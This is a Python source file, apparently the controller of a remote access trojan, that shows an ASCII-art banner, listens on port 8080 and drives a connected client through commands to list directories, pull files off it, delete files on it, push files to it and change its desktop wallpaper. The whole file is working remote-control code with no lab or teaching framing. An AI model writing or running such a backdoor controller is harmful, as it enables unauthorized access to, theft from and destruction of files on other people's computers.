import os
import socket
import ctypes

s = socket.socket()
#host = socket.gethostname()
host = "0.0.0.0"
port = 8080

print("111111                               1111111111111")
print("111111                               1111111111111")
print("1111                                   11111111111")
print("                                         111111111")
print("                                           1111111")
print("               1░▒░░01                      111111")
print("              1▒▒▒▒░░▒▒░░░0001               11111")
print("             10▓▒▓▓▓▒░░▒░░░░░▒▒░01           11111")
print("             10▓▒▓▓▓▓▓▒░░░░░░░░░░▒▒░1        11111")
print("           10▒▓▓▒▒▓▓▓▓▒░░░░░░▒░░░░░░▒░1      11111")
print("          1▒▓▓▓▓▓▓▓▓▓▒░░░░░░░▒░1░▒▒░░▓01        11")
print("         0▒▒▒▓▓▓▓▓▓▓▓░░░░░░░░░▒░▒▒▒░░░▒░1         ")
print("        0▓▒░▓▓▓▓▓▓▓▒▓▓▒░▒▒░░░░░░░░░░░░░▒░1        ")
print("       1▓▓░░▓▓▓▓▓▓▒░▓▓▓▓▓▓▓▒▒▒▓▒▒░░░░▒░░▒▒1       ")
print("       10░▒▒▓▓▓▓▓▓▓▒░▒▓▓▓▓▓▓▓▓▓▓▒▒░░░░▒▓▓▒1       ")
print("        110░▒▓▓▓▓▓▓▓▒▒▒▓▓▓▓▓▓▓▒▒▒▒░░░░░▒▓0        ")
print("          111░▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░░▒▒▓▒0         ")
print("           11100▒▓▓▓▓▓▓▓▓▓░░░░▒▓▓▓▒▒▒▒▒1          ")
print("             11110▒▓▓▓▓▓▓░111110░▒▒▒▒▒01          ")
print("              111110▒▓▓▓▒011    111111            ")
print("                11111░▒▓▒01                     11")
print("111                1110░▒11                 111111")
print("111111111111111       1111              1111111111")
print("11111111111111111111          11111111111111111111")
print("00001111111111111111111111111111111111111111100000")
print("00000000001111111111111111111111111111000000000000")

s.bind((host,port))
print("")
print(" Server is currently running @ ",host)
print("")
print(" Waiting for any incoming connections...")
s.listen(1)
conn ,addr = s.accept()
print("")
print(addr,"Has connected to the server successfully ")

while 1:
    print("")
    command = input(str("Command >> "))
    if command == "view_cmd":
        conn.send(command.encode())
        print("")
        print("Command sent waiting for execution ... ")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command outopt : ",files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir : "))
        conn.send(user_input.encode())
        print("")
        print("Command has sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ",files)

    elif command == "download_file":
        conn.send(command.encode())
        print("")
        filepath = input("Please enter the file path including the filename: ")
        conn.send(filepath.encode())

        print("Receiving file...")
        file_data = b""
        while True:
            chunk = conn.recv(4096)
            if b"[END_OF_FILE]" in chunk:
                file_data += chunk.replace(b"[END_OF_FILE]", b"")
                break
            file_data += chunk

        print("")
        filename = input("Please enter a filename to save the file (with extension): ")
        with open(filename, "wb") as new_file:
            new_file.write(file_data)

        print("")
        print(filename, "has been downloaded and saved successfully.")
        print("")
    
    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir =  input(str("Please enter the filename and drectory :"))
        conn.send(fileanddir.encode())
        print("")
        print("Command has been executed successfully : File Remove")

    elif command == "send_files":
        conn.send(command.encode())

        # รับ path และชื่อไฟล์
        file_path = input("Please enter the filename and directory of the file: ")
        filename = input("Please enter the filename for the file being sent: ")

        # ส่งชื่อไฟล์ให้ Client ก่อน
        conn.send(filename.encode())

        # เปิดและส่งไฟล์แบบ block
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    conn.send(chunk)
            conn.send(b"[END_OF_FILE]")  # ✅ Marker บอกว่าไฟล์ส่งครบแล้ว
            print(f"{file_path} has been sent successfully.")
        except FileNotFoundError:
            print("File not found.")
            conn.send(b"[ERROR] File not found.")


    elif command == "sleep":
        conn.send(command.encode())

    elif command == "change_desktop":
        conn.send(command.encode())
        file_image = input(str("Enter file image path :"))
        conn.send(file_image.encode())
        print("sent change_desktop ok")
        #data = open(file,"rb")

    else:
        print("")
        print("Command not recoonised")